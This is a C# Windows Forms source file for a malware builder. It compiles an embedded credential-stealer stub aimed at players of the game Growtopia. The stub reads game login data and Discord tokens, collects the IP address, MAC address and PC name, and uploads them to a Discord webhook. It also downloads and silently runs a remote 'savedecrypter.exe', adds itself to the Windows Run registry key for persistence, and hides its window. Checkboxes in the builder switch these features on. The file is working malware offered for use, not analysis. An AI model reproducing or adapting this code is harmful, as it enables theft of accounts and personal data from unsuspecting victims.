using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApplication31
{
    public partial class Form1 : Form
    {
        class stubcode
        {
            public string stubs = @"using System.Reflection;
using System.Runtime.InteropServices;
using System;
using System.Net;
using System.Collections.Specialized;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;

namespace basicst
{
    public class basicstealer : IDisposable
    {

        public string WebHook { get; set; }

        public string Attachment { get; set; }

        public basicstealer()
        {
            this.discordCli = new WebClient();
        }

        public void SendMessage(string msgSend)
        {
            basicstealer.discordValues.Add(""content"", msgSend);
            this.discordCli.UploadValues(this.WebHook, basicstealer.discordValues);
        }

        public void SendAttachment(string path)
        {
            this.discordCli.UploadFile(this.WebHook, path);
        }

        public void Dispose()
        {
            this.discordCli.Dispose();
        }

        private readonly WebClient discordCli;

        private static NameValueCollection discordValues = new NameValueCollection();
    }

    internal class Program
    {
        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia"", previus;
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\save.dat"";
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        public static void popup(string username, string password)
        {
            if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
            {

            }
            else
            {
                previus = username + password;
                WebClient webClient = new WebClient();
            string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
            using (basicstealer webhook = new basicstealer())
            {
                webhook.WebHook = ""#webhook"";
                webhook.SendMessage(string.Concat(new string[]
				{
                    ""GrowID: "",
                    username,
                    ""\nPassword: "",
                    password,  
					""\nIp adress: "",
					ip,
                    ""\nMac Adress: "",
					GetMACAddress(),
					""\nDiscord token: "",
					//discordtoken,
					""\nPC Name: "",
					Environment.UserName,
					""/"",
					Environment.MachineName
				}));
                }
            }
        }
        [DllImport(""Kernel32.dll"")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport(""User32.dll"")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);


        public static string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            string macadressgrabber = sMacAddress;
            return macadressgrabber;
        }


        public static string takeToken()
        {
            try
            {
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ""//Discord//Local Storage//leveldb//000005.ldb"");
                int num;
                while ((num = text.IndexOf(""oken"")) != -1)
                {
                    text = text.Substring(num + ""oken"".Length);
                }
                return text.Split('""')[1];
            }
            catch (Exception)
            {
                return null;
            }
        }


        public static void Startup()
        {
            string asd = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath);
            try
            {
                if (File.Exists(asd))
                {
                    File.Delete(asd);
                }
                File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
                registryKey.SetValue(Path.GetFileNameWithoutExtension(asd), asd);
            }
            catch
            {
                Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(asd));
                if (processesByName.Length > 0)
                {
                    Process[] array = processesByName;
                    int num = 0;
                    if (num < array.Length)
                    {
                        Process process = array[num];
                        process.Kill();
                    }
                }
            }
        }
        public static void tracesavedat()
        {
            new WebClient().DownloadFile(""https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe"", Path.GetTempPath() + ""\\savedecrypter.exe"");// ama's savedecrypter
            new FileStream(Path.GetTempPath() + ""\\user.txt"", FileMode.OpenOrCreate, FileAccess.Write).Close();
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.GetTempPath() + ""\\savedecrypter.exe"",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            string[] packet = File.ReadAllText(Path.GetTempPath() + ""\\user.txt"").Split('|');
            popup(packet[0], packet[1]);
            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = ""*.dat"";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            System.Threading.Thread.Sleep(-1);
        }
        private static void Main(string[] args)
        {
            //regeditstartup
            //tracesavedat
            IntPtr consoleWindow = Program.GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {
                Program.ShowWindow(consoleWindow, 0);
            }
            WebClient webClient = new WebClient();
            string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
            using (basicstealer webhook = new basicstealer())
            {
                webhook.WebHook = ""#webhook"";
                webhook.SendMessage(string.Concat(new string[]
				{
					""Ip adress: "",
					ip,
                    ""\nMac Adress: "",
					GetMACAddress(),
					""\nDiscord token: "",
					//discordtoken,
					""\nPC Name: "",
					Environment.UserName,
					""/"",
					Environment.MachineName
				}));
                webhook.SendAttachment(savePath);
            }
        }
        private static void OnSaveChanged(object source, FileSystemEventArgs e)
        {
            if (e.FullPath == savePath)
            {
                try
                {
                    new FileStream(Path.GetTempPath() + ""\\user.txt"", FileMode.OpenOrCreate, FileAccess.Write).Close();
                back:
                    if (File.Exists(Path.GetTempPath() + ""\\savedecrypter.exe""))
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.GetTempPath() + ""\\savedecrypter.exe"",
                            WindowStyle = ProcessWindowStyle.Hidden
                        }).WaitForExit();
                    }
                    else
                    {
                        new WebClient().DownloadFile(""https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe"", Path.GetTempPath() + ""\\savedecrypter.exe"");// savedecrypter
                        goto back;
                    }
                    string[] packet = File.ReadAllText(Path.GetTempPath() + ""\\user.txt"").Split('|');
                    fileSystemWatcher.EnableRaisingEvents = false;
                    if (previus != packet[0] + packet[1])
                    {
                        previus = packet[0] + packet[1];
                        if(string.IsNullOrEmpty(packet[0]) || string.IsNullOrEmpty(packet[1]))
                        {

                        }
                        else
                        {
                            popup(packet[0], packet[1]);
                        }                    
                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
    }
}
";
        }
        class Compiler
        {
            private static readonly string[] referencedAssemblies = new string[]
        {
            "System.dll",
            "System.Windows.Forms.dll",
            "System.Drawing.dll",
            "Microsoft.VisualBasic.dll"
        };

            public static bool CompileFromSource(string source, string outputAssembly)
            {

                var providerOptions = new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" }
            };

                var compilerOptions = "/target:winexe /platform:anycpu /optimize";

                using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    var compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = true,
                        OutputAssembly = outputAssembly,
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                    };
                    var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, source);

                    if (compilerResults.Errors.Count > 0)
                    {
                        MessageBox.Show(string.Format("The compiler has encountered {0} errors",
                             compilerResults.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
                             MessageBoxIcon.Error);

                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName), "Error",
                                MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }

                    return compilerResults.Errors.Count == 0;
                }
            }
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                using (var saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        stubcode sc = new stubcode();
                        var stub = sc.stubs;
                        stub = stub.Replace("%Guid%", Guid.NewGuid().ToString());
                        stub = stub.Replace("#webhook", textBox1.Text);

                        if (checkBox1.Checked == true)
                        {
                            stub = stub.Replace("//tracesavedat", "tracesavedat();");
                        }
                        if (checkBox2.Checked == true)
                        {
                            stub = stub.Replace("//regeditstartup", "Startup();");
                        }
                        if (checkBox3.Checked == true)
                        {
                            stub = stub.Replace("//discordtoken,", "takeToken(),");
                        }

                        var succes = Compiler.CompileFromSource(stub, saveFileDialog.FileName);

                        if (succes)
                        {
                            MessageBox.Show("successful build!");
                        }
                    }
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
    }
}
